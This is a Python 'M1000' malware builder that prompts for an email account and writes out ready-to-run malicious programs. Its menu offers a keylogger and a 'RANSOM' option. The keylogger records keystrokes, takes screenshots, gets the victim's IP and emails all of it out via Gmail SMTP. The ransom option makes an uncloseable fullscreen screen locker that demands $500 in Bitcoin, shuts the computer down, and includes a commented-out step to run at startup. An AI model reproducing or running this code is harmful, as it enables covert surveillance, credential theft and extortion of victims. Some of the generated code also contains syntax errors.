import os
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import fade,random,os,sys,time,webbrowser,pygame,smtplib
from termcolor import colored
from time import sleep
from tqdm import tqdm
from pystyle import Write, Colors, Colorate, Center
from PIL import Image
os.system('cls' if os.name in ('nt', 'dos') else 'clear') 

ASCİİ = """
         .AMMMMMMMMMMA.
       .AV. :::.:.:.::MA.
      A' :..        : .:`A
     A'..              . `A.
    A' :.    :::::::::  : :`A
    M  .    :::.:.:.:::  . .M
    M  :   ::.:.....::.:   .M
    V : :.::.:........:.:  :V           ███╗░░░███╗░░███╗░░░█████╗░░█████╗░░█████╗░
   A  A:    ..:...:...:.   A A          ████╗░████║░████║░░██╔══██╗██╔══██╗██╔══██╗
  .V  MA:.....:M.::.::. .:AM.M          ██╔████╔██║██╔██║░░██║░░██║██║░░██║██║░░██║
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A         ██║╚██╔╝██║╚═╝██║░░██║░░██║██║░░██║██║░░██║
:M .  .`VMMMMMMV.:A `VMMMMV .:M:        ██║░╚═╝░██║███████╗╚█████╔╝╚█████╔╝╚█████╔╝
 V.:.  ..`VMMMV.:AM..`VMV' .: V         ╚═╝░░░░░╚═╝╚══════╝░╚════╝░░╚════╝░░╚════╝░
  V.  .:. .....:AMMA. . .:. .V
   VMM...: ...:.MMMM.: .: MMV
       `VM: . ..M.:M..:::M'
         `M::. .:.... .::M
          M:.  :. .... ..M
          V:  M:. M. :M .V
          `V.:M.. M. :M.V'
            
                   """
banner1 = fade.purplepink(ASCİİ)
print(banner1)

def MAİN(result):
    os.system('cls' if os.name in ('nt', 'dos') else 'clear') 
    banner1 = fade.purplepink(ASCİİ)
    print(banner1)
    if result == '1':
        Write.Print(f"""What will the name of the app be?\n""", Colors.purple_to_red, interval=0.05)
        APPNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"""Your Email Address?\n""", Colors.purple_to_red, interval=0.05)
        EMAILNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"""Your Email Password?\n""", Colors.purple_to_red, interval=0.05)
        PASSWNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        with open(APPNAME+".py", "w") as keyL:
            keyL.write('''
###########################################
███╗░░░███╗░░███╗░░░█████╗░░█████╗░░█████╗░
████╗░████║░████║░░██╔══██╗██╔══██╗██╔══██╗
██╔████╔██║██╔██║░░██║░░██║██║░░██║██║░░██║
██║╚██╔╝██║╚═╝██║░░██║░░██║██║░░██║██║░░██║
██║░╚═╝░██║███████╗╚█████╔╝╚█████╔╝╚█████╔╝
╚═╝░░░░░╚═╝╚══════╝░╚════╝░░╚════╝░░╚════╝░
###########################################
import pynput.keyboard
import smtplib,os
import threading
import webbrowser
from datetime import *
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders
from requests import get
from mss import mss


webbrowser.open("https://www.instagram.com/")
IP = get('https://api.ipify.org').content.decode('utf8')
saat = datetime.now().strftime("%H:%M")



class Keylogger:
        def __init__(self, time_interval, email, password):
            self.logger = "[Keylogger Başlatıldı - IP Adresi: " + IP + "]\#n"
            self.subject = "Keylogger Raporu" + " - " + IP + " - " + saat
            self.email = email
            self.password = password
            self.interval = time_interval
        

        def append_to_log(self, key_strike):
            self.logger = self.logger + key_strike

        def evaluate_keys(self, key):
            try: 
                Pressed_key = str(key.char)
            except AttributeError:
                if key == key.space:	
                    Pressed_key =  " "
                else:
                    Pressed_key =  " " + str(key) + " "
            self.append_to_log(Pressed_key)


        def report(self):
            self.send_mail(self.email, self.password, self.subject, self.logger)
            self.logger = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

            
    
    
        def send_mail(self, email, password, subject, message):
                        mss().shot()
                        Email_message = 'Subject: {}\#n\#n{}'.format(subject, message)
                        msg = MIMEMultipart()
                        msg['From'] = email
                        msg['To'] = "'''+EMAILNAME+'''"
                        msg['Date'] = formatdate(localtime = True)
                        msg['Subject'] = subject
                        msg.attach(MIMEText("Keylogger Screenshot "+IP+"  "+saat+"\#n\#n"+Email_message))
                        part = MIMEBase('application', "octet-stream")
                        part.set_payload(open("M1000-1.png", "rb").read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment; filename="M1000-1.png"')
                        msg.attach(part)
                        smtp = smtplib.SMTP("smtp.gmail.com", 587)
                        smtp.starttls()
                        smtp.login(email,password)
                        smtp.sendmail("'''+EMAILNAME+'''", ""'''+EMAILNAME+'''", msg.as_string())
                        smtp.quit()
    

        def start(self):
            keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()

    
    

    


my_keylogger = Keylogger(20, "'''+EMAILNAME+'''", "'''+PASSWNAME+'''")
my_keylogger.start())''')
        Write.Print(f"""Success Created File\n""", Colors.green, interval=0.05)
        MAİN()
    if result == '2':
        Write.Print(f"""What will the name of the app be?\n""", Colors.purple_to_red, interval=0.05)
        APPNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"""Your Email Address?\n""", Colors.purple_to_red, interval=0.05)
        EMAILNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"""Your Email Password?\n""", Colors.purple_to_red, interval=0.05)
        PASSWNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        Write.Print(f"""Your BTC Address?\n""", Colors.purple_to_red, interval=0.05)
        BTCNAME = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
        with open(APPNAME+".py", "w") as keyL:
            keyL.write('''


#############################################
#███╗░░░███╗░░███╗░░░█████╗░░█████╗░░█████╗░#
#████╗░████║░████║░░██╔══██╗██╔══██╗██╔══██╗#
#██╔████╔██║██╔██║░░██║░░██║██║░░██║██║░░██║#
#██║╚██╔╝██║╚═╝██║░░██║░░██║██║░░██║██║░░██║#
#██║░╚═╝░██║███████╗╚█████╔╝╚█████╔╝╚█████╔╝#
#╚═╝░░░░░╚═╝╚══════╝░╚════╝░░╚════╝░░╚════╝░#
#############################################

from calendar import c
from tkinter.font import Font
import pyautogui,random,smtplib,time,os
from tkinter import Tk, Entry, Label
from tkinter import messagebox
from pyautogui import click, moveTo
from tkinter import *
from time import sleep 
import webbrowser,sys,os,getpass

USER_NAME = getpass.getuser()
file_path=""

try:    
        
        ##########################################
        #               DANGER ZONE              #
        #          ARE U SURE SET STARTUP?       #
        ##########################################  
        #if file_path == "":
                #file_path = os.path.realpath(__file__)
        #bat_path = r'C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.format(USER_NAME)
        #with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                #bat_file.write(r'start "" "{}"'.format(file_path))
        
        ##########################################
        #               DANGER ZONE              #
        #          ARE U SURE SET STARTUP?       #
        ##########################################      
        
                  
                
        window = Tk()
        pyautogui.FAILSAFE = False
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        window.title("M1000 Hacked")
        window.attributes("-fullscreen",True)
        entry = Entry(window, font = 1)
        entry.place(relx=0.5, rely=0.5, anchor=CENTER)
        label0 = Label(window,text="HACKED BY M1000", font=1,fg="black")#DON'T FORGET TO SIGN:)
        label0.place(relx=0.5, rely=0.6, anchor=N)


        label01 = Label(window,text="𝓖𝓸𝓸𝓭 𝓛𝓾𝓬𝓴", font=1,fg="black")
        label01.place(relx=0.5, rely=0.7, anchor=N)

        label1 = Label(window, text="IF YOU WANT TO GET OUT OF THIS, SEND $500 in BTC/ETH TO THIS ADDRESS!\#n\#n'''+BTCNAME+'''", font ="Arial 17 bold",bg="white",fg="black")
        label1.place(relx=0.5, rely=0.2, anchor=N)

        label10 = Label(window, text="DO YOU NEED HELP?\n WRİTE--> 12", font ="Arial 20 bold",fg="black")
        label10.place(relx=0.5, rely=0.9, anchor=N)


        window.update()
        sleep(0.2)
        click(width/2, height/2)
        

        def altf4(event):
                liste=['Well, I wouldnt have loved it...','Dont Try This!','Come On...','I know youre cursing me, but theres nothing you can do.','Type your answer and press ENTER.']
                liste = random.choice(liste)
                messagebox.showinfo("M1000", liste)
        def callback(event):
                global k, entry
                if entry.get()=="yes" or entry.get()=="YES" or entry.get()=="Yes" or entry.get()=="Sure" or entry.get()=="sure" or entry.get()=="SURE":#if you want to add more answers, add them here.
                        k = True
                        toaddr = "'''+EMAILNAME+'''"
                        subject = "M1000 Hacked"
                        message = """M1000 Hacked"""
                        content = 'Subject: {0}\#n,{1}'.format(subject, message)
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login("'''+EMAILNAME+'''", "'''+PASSWNAME+'''")
                        mail.sendmail("YOUR_EMAİL", toaddr, content)
                        mail.close()
                if entry.get()=="12":
                        messagebox.showinfo("M1000","CONTACT ME ON DİSCORD\#nM1000#8093")#YOUR CONTACT INFO
                        
                        
                ###İF YOU WANT###
                #if entry.get()=="10":
                        #webbrowser.open('')#YOUR BTC ADDRESS QR CODE LİNK
                ###İF YOU WANT###


                if entry.get()=="no" or entry.get()=="NO":#if you want to add more answers, add them here.
                        messagebox.showinfo("M1000", "I wouldn't want to do this...")
                        time.sleep(1)
                        messagebox.showinfo("M1000", "GoodBye Niss...")
                        os.system("shutdown /p")
                
        def quit():
                exit()
                    
        def on_closing():
                click(width/2, height/2)
                moveTo(width/2,height/2)
                window.attributes("-fullscreen", True)
                window.protocol("WM_DELETE_WİNDOW", on_closing)
                window.update()
                window.bind("<Control-KeyPress-c>",callback)
                window.bind("<Control-KeyPress-p>",callback)
                window.bind("<Return>",callback)
                window.bind("<Alt-KeyPress-F4>",altf4)
                window.bind("<Alt-KeyPress-Tab>",altf4)

        k = False 
        while not k:
           on_closing()
except:
        os.execl(sys.executable, os.path.abspath(__file__), *sys.argv) # IF WE RECEIVE AN ERROR, THE APPLICATION WILL RESTART.
        ''')
    
    
    
    
    Write.Print(f"""Thanks For Choosing The M1000👁\n""", Colors.green_to_cyan, interval=0.05)

Write.Print(f"""1-KEYLOGGER\n2-RANSOM\n3-Google Services\n""", Colors.purple_to_red, interval=0.05)
result = Write.Input(">>> ", Colors.red_to_purple, interval=0.0025)
MAİN(result)